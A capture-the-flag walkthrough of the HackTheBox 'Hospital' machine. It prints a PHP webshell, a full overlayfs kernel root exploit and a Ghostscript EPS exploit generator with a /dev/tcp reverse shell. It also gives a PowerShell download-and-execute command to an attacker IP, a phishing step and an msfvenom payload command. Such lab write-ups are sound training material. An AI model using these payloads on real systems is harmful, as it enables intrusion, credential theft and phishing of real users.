---
title: "HackTheBox - Hospital"
date: 2025-04-14 00:00:00 +0800
categories: [HackTheBox]
tags: [Hacking, CTF, Pentesting, HackTheBox, HTB, Medium, Web, AD, Active Directory, Windows, Keylogger, Reverse Shell, Phishing, CVE, Realistic, php, bypass, hashcat, ffuf, Kernel, sudo, CMS]
author: 0xT0xic
image:
    path: https://pbs.twimg.com/media/F_D4Z-xXYAABRzU?format=jpg&name=medium
---

Hospital is a medium-rated Windows box with real-world attacks like uploading a PHP shell with some simple bypass techniques, cracking some hashes, Phishing Attacks and uploading keylogger to dump keystrokes from active users.

## Reconnaissance

### Network Scanning

We start with a network scan and find many open ports, but only 443 and 8080 are useful in this case.

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">scan-results.txt</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-04-12 20:35:02Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-12T20:35:55+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-04-11T18:31:32
|_Not valid after:  2025-10-11T18:31:32
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6613/tcp  open  msrpc             Microsoft Windows RPC
6634/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp  open  mc-nmf            .NET Message Framing
29688/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:5.0
Aggressive OS guesses: Linux 5.0 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-12T20:35:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   18.73 ms 10.10.14.1
2   18.75 ms 10.10.11.241</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

Important Scan Results:

- `Port 443: Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)`
- `Port 8080: Apache httpd 2.4.55 ((Ubuntu))`

## Web Enumeration Part I (Port 8080)

### Upload Function

Visiting the site on port 8080 shows a login page. We can register and log in as a user.

<img src="https://i.ibb.co/4nf1QfD5/1.png" alt="Hospital" width="650">


After logging in, we find a file upload function. But it blocks direct .php uploads.

<img src="https://i.ibb.co/h1BT7pG4/2.png" alt="Hospital" width="650">

We brute-force various file extensions using burp-suite's Intruder. Eventually, we discover that `.phar` files are accepted and processed like PHP.

<img src="https://i.ibb.co/Ng7wyMk9/3.png" alt="Hospital" width="650">

### Directory Fuzzing

Now we need to locate our uploaded file. We fuzz for directories and quickly discover the endpoint:

- `/uploads`

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Uploaded file locations</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">http://IP:8080/uploads/uploaded_file</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

<img src="https://i.ibb.co/DP5RTtcx/4.jpg" alt="Hospital" width="750">

## Web Shell in SSH as www-data

### Upload function

We upload a basic PentestMonkey PHP webshell as .phar. However, the shell doesn't work — the connection dies immediately.

<img src="https://i.ibb.co/zTv7kjbt/5.png" alt="Hospital" width="650">

Some PHP functions seem to be blacklisted. We craft a less suspicious reverse shell, and it successfully executes.

<img src="https://i.ibb.co/MDZmxRrK/6.png" alt="Hospital" width="650">

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">revshellworking.phar | less suspicious reverse shell</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash"><?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
if ($cmd) {
    $handle = popen($cmd, "r");
    while (!feof($handle)) {
        echo fgets($handle);
    }
    fclose($handle);
}
> # Add ? before > at the end</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

To get a stable shell, we use a BusyBox reverse shell from [revshells.com](https://revshells.com) from zeroday

## Root Shell in SSH

### Linux Kernel Exploitation

We check the kernel version `5.19.0-35-generic Ubuntu` and find it’s vulnerable to:
- [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main)

Straight forward execution of the exploit.sh will result in a root shell.

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">exploit.sh</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

<img src="https://i.ibb.co/GQ61nXNK/7.jpg" alt="Hospital" width="850">

### Hash Cracking

Now that we have root, we can read the `/etc/shadow` file. We extract the password hash for the user drwilliams and crack it using Hashcat.

<img src="https://i.ibb.co/FqyL2hxd/8.png" alt="Hospital" width="850">

<img src="https://i.ibb.co/RGmrtgPL/9.jpg" alt="Hospital" width="750">

## Web Enumeration Part II (Port 443)

### Webmail Portal

Using the cracked password, we log into the hospital's webmail portal, which is running roundcube on port 443 with:

- `drwilliams : qwxxxxxxxxx`

Once logged in, we see that user `drbrown is requesting an .eps file, which is supossed to be well visualized with Ghostscript` for his 3D design. EPS files are often opened using GhostScript, which is known to have past vulnerabilities.

<img src="https://i.ibb.co/ZznQMwYP/10.png" alt="Hospital" width="750">

### CVE Research

We find a relevant CVE, which we can exploit, after a quick research:

- [CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/CVE_2023_36664_exploit.py) What a coincidence lmao

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">CVE_2023_36664_exploit.py</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">import argparse
import re
import os

# Function to generate payload for reverse shell
def generate_rev_shell_payload(ip, port):
    payload = f"UNIX_REV_SHELL_PAYLOAD=f\"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196\""
    return payload

# Function to generate dummy PS or EPS file with payload
def generate_payload_file(filename, extension, payload):
    if extension == 'ps':
        content = f"""%!PS
/Times-Roman findfont
24 scalefont
setfont

100 200 moveto
(Welcome at vsociety!) show

30 100 moveto
60 230 lineto
90 100 lineto
stroke
{payload}
showpage"""
        
    elif extension == 'eps':
        content = f"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Welcome EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Welcome at vsociety!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
{payload}
showpage"""

    filename = filename + '.' + extension
    with open(filename, 'w') as file:
        file.write(content)

# Function to inject payload into an existing file
def inject_payload_into_file(filename, payload):
    # Check if the file has the .eps or .ps extension
    if filename.lower().endswith('.eps'):
        # Read the existing content of the EPS file
        with open(filename, 'r') as eps_file:
            lines = eps_file.readlines()

        # Find the first line not starting with %
        for i, line in enumerate(lines):
            if not line.strip().startswith('%'):
                # Insert the payload at this line
                lines.insert(i, payload + '\n')
                break

        # Write the modified content back to the file
        with open(filename, 'w') as eps_file:
            eps_file.writelines(lines)
    elif filename.lower().endswith('.ps'):
        # Append payload to the end of the PS file
        with open(filename, 'a') as ps_file:
            ps_file.write('\n' + payload)
    else:
        print("[-] Only PS and EPS extensions are allowed.")
        

# Main function
def main():
    parser = argparse.ArgumentParser(description="Creating malicious PS/EPS files exploiting CVE-2023-36664.")
    parser.add_argument("-g", "--generate", action="store_true", help="Generate a new file")
    parser.add_argument("-i", "--inject", action="store_true", help="Inject payload into an existing file")
    parser.add_argument("-p", "--payload", help="Payload to inject")
    parser.add_argument("-r", "--revshell", action="store_true", help="Generate reverse shell payload")
    parser.add_argument("-ip", "--ip", help="IP address for reverse shell payload")
    parser.add_argument("-port", "--port", help="Port number for reverse shell payload")
    parser.add_argument("-x", "--extension", choices=["ps", "eps"], help="Extension for the generated file")
    parser.add_argument("-f", "--filename", default="malicious", help="Filename for the generated or injected file")

    args = parser.parse_args()

    # Validate payload options
    if args.revshell and args.payload:
        print("[-] Both --payload and --revshell cannot be used together.")
        return

    if args.revshell:
        # Validate IP and port for reverse shell payload
        if args.ip and args.port:
            ip_pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
            port_pattern = re.compile(r"^\d{1,5}$")

            if not ip_pattern.match(args.ip) or not port_pattern.match(args.port):
                print("[-] Invalid IP address or port number.")
                return
        else:
            print("[-] For reverse shell payload, both IP and port are required.")
            return
        payload = generate_rev_shell_payload(args.ip, args.port)

    elif args.payload:
        payload = args.payload

    else:
        print("[-] Either --payload or --revshell is required.")
        return

    # Modify payload for embedding
    payload = f"(%pipe%{payload}) (w) file /DCTDecode filter"

    # Generate or inject payload
    if args.generate and args.inject:
        print("[-] Both -g/--generate and -i/--inject cannot be used together.")
    elif args.generate:
        if args.extension and (args.extension == "ps" or args.extension == "eps"):
            generate_payload_file(args.filename, args.extension, payload)
            print(f"[+] Generated {args.extension.upper()} payload file: {args.filename}.{args.extension}")
        else:
            print("[-] For generating files, specify valid extension using -x/--extension: 'ps' or 'eps'.")
    elif args.inject:
        if os.path.exists(args.filename):
            inject_payload_into_file(args.filename, payload)
            print(f"[+] Payload successfully injected into {args.filename}.")
        else:
            print(f"[-] File {args.filename} not found.")
    else:
        print("[-] Specify either -g/--generate or -i/--inject.")

if __name__ == "__main__":
    main()</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

## User Shell in AD as drbrown

### Crafting of the Malicious EPS File

We use the exploit, which we get from the CVE founder's github repository to generate a malicious .eps file:

- `python3 EPS2R3VS.py --revshell -ip 10.10.10.10 -port 443 --generate --extension eps`

 Since it isn't pre-created to get a windows reverse shell, we have to change the last line of the created .eps file to our own made Powershell Command. Be sure to change the IP address in the payload to your own.

Powershell Command: `(%pipe%powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')") (w) file /DCTDecode filter showpage`


Change the .eps file now from:

<img src="https://i.ibb.co/qYCSy2Bt/11.jpg" alt="Hospital" width="750">

to:

<img src="https://i.ibb.co/Zzjdpmzx/12.jpg" alt="Hospital" width="750">

We also have to create a rev.ps1 script containing a basic Windows reverse shell payload from [revshells.com](https://revshells.com)

Next:

Start an HTTP server:
- `python3 -m http.server 80`

Start a netcat listener:
- `nc -lvnp 443`

### Phishing Attack

We send the .eps file to drbrown via webmail. When the file is opened, we receive a reverse shell as drbrown and can read the user.txt, which is located at the Desktop directory.

<img src="https://i.ibb.co/5gy3ChkY/13.png" alt="Hospital" width="750">

<img src="https://i.ibb.co/ZzyyGrnG/14.png" alt="Hospital" width="750">

## Administrator Shell in AD

### Session Enumeration

Once inside as drbrown, we run the `quser` command. It shows that an active desktop session named console is from drbrown open.

We decide to upgrade our shell to Meterpreter for more control.

Steps:

1. Create a malicious exe file, which will get us the meterpreter shell:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Msfvenom Command</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meter.exe</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

2. Start a multi/handler in Metasploit.

